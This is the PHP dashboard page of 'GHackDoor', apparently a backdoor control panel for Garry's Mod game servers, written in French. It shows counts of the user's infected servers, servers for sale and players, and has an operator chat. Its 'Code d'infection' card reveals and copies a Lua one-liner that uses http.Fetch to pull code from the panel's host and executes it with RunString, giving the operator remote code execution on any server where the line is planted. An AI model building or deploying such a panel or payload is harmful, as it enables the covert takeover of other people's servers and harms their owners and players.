<?php
include 'core/class/include.php';
$ip = $_SERVER['REMOTE_ADDR'];
if(BanIP::IsBanned($_SERVER["REMOTE_ADDR"]))
{
  die("Vous êtes banni IP, venez sur le discord pour vous faire debannir https://discord.gg/rVbb2Kx");
}
// Redirige l'utilisateur si il n'est pas authentifier
if (!Account::isAuthentified())
{
  header('Location: fe15hg6rt1e.php');

  exit();
}
$d = $_SERVER['SERVER_NAME'];
$color = Account::GetUser()["color"]; 
$colort = Account::GetUser()["color_second"]; 
$colorb = Account::GetUser()["color_trois"]; 
if($colorb == "")
 $colorb = "1a6d7d";
if($colort == "")
 $colort = "ffffff";
if($color == "")
 $color = "1c1c1c";
?>
<!DOCTYPE html>

<?php
include 'defaultpage.php';
?>

<body id="page-top">



  <!-- Page Wrapper -->
  <div id="wrapper">
    <?php
    include 'defaultnav.php';
    ?>

    <!-- Content Wrapper -->
    <div id="content-wrapper" class="d-flex flex-column">

      <!-- Main Content -->
      <div id="content">

       <?php
       include 'defaultnavbar.php';
       ?>

       <!-- Begin Page Content -->
       <div class="container-fluid">

        <!-- Content Row -->
        <div class="row">

          <!-- Earnings (Monthly) Card Example -->
          <div class="col-xl-3 col-md-6 mb-4">
            <div class="card border-left-primary shadow h-100 py-2">
              <div class="card-body">
                <div class="row no-gutters align-items-center">
                  <div class="col mr-2">
                    <div class="text-xs font-weight-bold text-primary text-uppercase mb-1"><?php echo $lang["servers"]; ?></div>
                    <div class="h5 mb-0 font-weight-bold text-gray-800"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => $_SESSION["id"]]); ?></div>
                  </div>
                  <div class="col-auto">
                    <i class="fas fa-server fa-2x text-gray-300"></i>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Earnings (Monthly) Card Example -->
          <div class="col-xl-3 col-md-6 mb-4">
            <div class="card border-left-success shadow h-100 py-2">
              <div class="card-body">
                <div class="row no-gutters align-items-center">
                  <div class="col mr-2">
                    <div class="text-xs font-weight-bold text-success text-uppercase mb-1"><?php echo $lang["sellservers"]; ?></div>
                    <div class="h5 mb-0 font-weight-bold text-gray-800"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => "666"]); ?></div>
                  </div>
                  <div class="col-auto">
                    <i class="fas fa-money-bill-wave fa-2x text-gray-300"></i>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!-- Earnings (Monthly) Card Example -->
          <div class="col-xl-3 col-md-6 mb-4">
            <div class="card border-left-warning shadow h-100 py-2">
              <div class="card-body">
                <div class="row no-gutters align-items-center">
                  <div class="col mr-2">
                    <div class="text-xs font-weight-bold text-warning text-uppercase mb-1"><?php echo $lang["players"]; ?></div>
                    <div class="h5 mb-0 font-weight-bold text-gray-800"><?php echo $GLOBALS['DB']->Count("players_list"); ?></div>
                  </div>
                  <div class="col-auto">
                    <i class="fas fa-user-friends fa-2x text-gray-300"></i>
                  </div>
                </div>
              </div>
            </div>
          </div>


          <!-- Earnings (Monthly) Card Example -->
          <div class="col-xl-3 col-md-6 mb-4">
            <div class="card border-left-info shadow h-100 py-2">
              <div class="card-body">
                <div class="row no-gutters align-items-center">
                  <div class="col mr-2">
                    <div class="text-xs font-weight-bold text-info text-uppercase mb-1"><?php echo $lang["requests"]; ?></div>
                    <div class="row no-gutters align-items-center">
                      <div class="col-auto">
                        <div class="h5 mb-0 mr-3 font-weight-bold text-gray-800"><?php echo Stats::GetValue("nbreqs"); ?></div>
                      </div>
                      <div class="col">
                      </div>
                    </div>
                  </div>
                  <div class="col-auto">
                    <i class="fas fa-clipboard-list fa-2x text-gray-300"></i>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Content Row -->



          <!-- Content Row -->
          <div class="row">

            <!-- Content Column -->
            <div class="col-lg-6 mb-4">

              <!-- Project Card Example -->


              <!-- <div class="card shadow mb-4">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-primary"><?php echo $lang["project"]; ?></h6>
                </div>
                <div class="card-body">
                <h4 class="small font-weight-bold">Réouverture GHackdoor <span class="float-right">85%</span></h4>
                  <div class="progress mb-4">
                  <div class="progress-bar bg-info" role="progressbar" style="width: 85%" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100"></div>
                  </div>
                  <h4 class="small font-weight-bold">Nouveau Design <span class="float-right">85%</span></h4>
                  <div class="progress mb-4">
                    <div class="progress-bar bg-info" role="progressbar" style="width: 85%" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100"></div>
                  </div>
                  <h4 class="small font-weight-bold">Meilleur systeme des Comptes / Serveurs <span class="float-right">Terminer !</span></h4>
                  <div class="progress">
                    <div class="progress-bar bg-success" role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"></div>
                  </div>
                </div>
              </div>
              <div class="card shadow">
                <div class="card-header">
                  <h6 class="m-0 font-weight-bold text-primary"><?php echo $lang["rules"]; ?></h6>
                </div>
                <div class="card-body">
                
               <div class="mb-1 border-left-success shadow">
                    <div class="card-body">
                     <?php echo $lang["rules1"]; ?>
                    </div>
                </div>

                <div class="mb-1 border-left-success shadow">
                    <div class="card-body">
                      <?php echo $lang["rules2"]; ?>
                    </div>
                </div>

                <div class="mb-1 border-left-success shadow">
                    <div class="card-body">
                      <?php echo $lang["rules3"]; ?>
                    </div>
                </div>

                <div class="mb-1 border-left-success shadow">
                    <div class="card-body">
                      <?php echo $lang["rules4"]; ?>
                    </div>
                </div>

                </div>
              </div> -->




              <!-- Color System -->


            </div>



            <div  class="card" style="width: 80vw;margin-left: 50px;">
              <div class="card-header">
                <p>Code d'infection</p>
              </div>
              <div class="card-body">
                <style type="text/css">
                  .backdoor {
                    display: flex;
                  }
                </style>
                <li class="backdoor">
                  <button id="button_hide" type="button" style="" class="btn btn-primary text-white no-border" onclick="seebd();"><span>SHOW</span></button>
                  <button type="button" class="btn btn-primary text-white no-border" onclick="fetchurlcopy()"> <span>COPY</span> </button><br />
                  <input class="form-control" value="HIDDEN LINK" style=" "  id="copyfetch" readonly=""><br />
                  
                </li>
              </div>

            </div>
            <br /><br /><br /><br />
            <div class="container-fluid">
              <div class="row">
                <div class="col-lg-12">
                  <center>
                    <div class="calender-inner">
                      <div>
                        <font color="black" size="+3">REGLES</font>
                        <br/>
                        <font color="black" size="+1">UNE REGLES</font>
                        <br/>
                        <hr class="sidebar-divider">
                        <br/>
                        <font color="black" size="+1">ENCORE UNE REGLE</font>
                        <br/>

                        <br/>
                        <hr class="sidebar-divider">
                        <br/>
                        <font color="black" size="+1">JE PENSE QUE TU AS COMPRIS</font>
                        <br/>
                        <hr class="sidebar-divider">
                        <br/>
                        <font color="black" size="+1">MODIFIE DANS DASHBOARD.PHP</font>
                        <br/>
                      </div>
                    </div>
                  </div>
                </center>
              </div>
            </div>
          </div>
        </div>
        <br/> <br/>
        <div class="row">

          <div class="card shadow mb-4" style="width: 1700px;">
            <div class="card-header py-3">
              <h6 class="m-0 font-weight-bold text-primary">Chat</h6>
            </div>
            <div class="card-body">
              <div class="panel-body" id="fucker-body">
                <div class="form-group">
                  <div class="panel-body" id="chate-body" style="color:white; background-color: white; overflow: scroll; height: 50vh;"></div>

                </div>
                <input type="text" class="form-control"  id="chat-text" placeholder="Votre Message"></textarea>
              </div><br />
              <button type="button" onclick="AddChat()" class="btn btn-success"><i class="fa fa-bolt"></i>&nbsp;Envoyer le message</button>
            </div>
          </div>
        </div>
        <script>
          $('.magiemagieetvosiesontdugeni').peity('line');
          function seebd()
          {
            if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[http://".$_SERVER['SERVER_NAME']."/f?k=".$_SESSION['id']."]],RunString)end)'){
              $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([[http://".$_SERVER['SERVER_NAME']."/f?k=".$_SESSION['id']."]],RunString)end)');
            }else{
              $('#copyfetch').val('HIDDEN LINK');
            }
          }

          function fetchurlcopy()
          {
            if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[http://".$_SERVER['SERVER_NAME']."/f?k=".$_SESSION['id']."]],RunString)end)'){
              $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([[http://".$_SERVER['SERVER_NAME']."/f?k=".$_SESSION['id']."]],RunString)end)');
              let copyText = document.getElementById('copyfetch' );
              copyText.select();
              document.execCommand('copy');
              $('#copyfetch').val('HIDDEN LINK');
            }else{
              let copyText = document.getElementById('copyfetch' );
              copyText.select();
              document.execCommand('copy');
            }
          }

        </script>

        <!-- Content Column -->
            <!-- <div class="col-lg-10 mb-6">
          <div class="card shadow mb-5">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-primary">Discord</h6>
                </div>
                <div class="card-body">
                  <iframe src="https://discordapp.com/widget?id=600417348502945815&theme=dark" width="250" height="500" allowtransparency="true" frameborder="0"></iframe>
                 </div>
              </div>
            </div>

          </div> -->

 <!-- <div class="card shadow mb-5">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-primary"></h6>
                </div>
                <div class="card-body">
                  
                  
       
                  </div>
                </div>
      

        
      

              

          </div>

        </div>
  

      </div>
    </div> -->


    <!-- Footer -->
     <!--  <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
            <span>Copyright &copy; GHackDoor 2019</span>
          </div>
        </div>
      </footer> -->
      <!-- End of Footer -->

    </div>
    <!-- End of Content Wrapper -->

  </div>
  <!-- End of Page Wrapper -->

  <!-- Scroll to Top Button-->
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>

  <!-- Logout Modal-->
  <div class="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="exampleModalLabel">Etes vous sur de vouloir vous déconnecter ?</h5>
          <button class="close" type="button" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">×</span>
          </button>
        </div>
        <div class="modal-body">Cliquer sur "Deconnexion" pour vous déconnecter.</div>
        <div class="modal-footer">
          <button class="btn btn-secondary" type="button" data-dismiss="modal">Annulé</button>
          <a class="btn btn-primary" href="logout.php">Deconnexion</a>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap core JavaScript-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Core plugin JavaScript-->
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom scripts for all pages-->
  <script src="js/sb-admin-2.min.js"></script>

  <!-- Page level plugins -->
  <script src="vendor/chart.js/Chart.min.js"></script>

  <!-- Page level custom scripts -->
  <script src="js/demo/chart-area-demo.js"></script>
  <script src="js/demo/chart-pie-demo.js"></script>
</body>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/datatables.bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script>
  function copyToClipboard(element) {
    var $temp = $("<input>");
    $("body").append($temp);
    $temp.val($(element).text()).select();
    document.execCommand("copy");
    $temp.remove();
  }
</script>
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/datatables.bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script src="https://benpickles.github.io/peity/jquery.peity.min.js"></script>

<?php
echo "
<script>
$('.magiemagieetvosiesontdugeni').peity('line');
function seebd()
{
  if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[".$actual_link."/f?k=".$_SESSION['id']."]],RunString)end)'){
    $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([".$actual_link."/f?k=".$_SESSION['id']."]],RunString)end)');
    }else{
      $('#copyfetch').val('HIDDEN LINK');
    }
  }

  function fetchurlcopy()
  {
    if ($('#copyfetch').val() != 'timer.Simple(0.90,function()http.Fetch([[".$actual_link."/f?k=".$_SESSION['id']."]],RunString)end)'){
      $('#copyfetch').val('timer.Simple(0.90,function()http.Fetch([[".$actual_link."/f?k=".$_SESSION['id']."]],RunString)end)');
      let copyText = document.getElementById('copyfetch' );
      copyText.select();
      document.execCommand('copy');
      $('#copyfetch').val('HIDDEN LINK');
      }else{
        let copyText = document.getElementById('copyfetch' );
        copyText.select();
        document.execCommand('copy');
      }
    }

    </script>
    ";
    ?>
    </html>
